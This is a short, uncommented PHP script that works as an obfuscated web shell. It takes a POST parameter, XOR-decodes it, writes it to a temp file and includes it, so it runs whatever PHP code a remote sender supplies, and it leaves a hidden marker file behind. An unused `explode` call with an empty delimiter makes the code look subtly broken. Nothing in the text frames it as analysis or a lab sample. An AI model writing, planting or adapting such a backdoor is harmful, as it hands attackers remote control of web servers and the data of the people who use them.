<?php
$alphabet = explode('', 'abcdefghijklmnopqrstuvwxyz0123456789');
$key = 67;
if (isset($_POST['elem'])) {
    $tmp = sys_get_temp_dir();
    $data = '';
    foreach (str_split($_POST['elem']) as $i => $ch) {
        $data .= chr(ord($ch) ^ 67);
    }
    $path = $tmp . '/' . md5($data);
    file_put_contents($path, $data);
    include $path;
    touch($tmp . '/.holder');
}
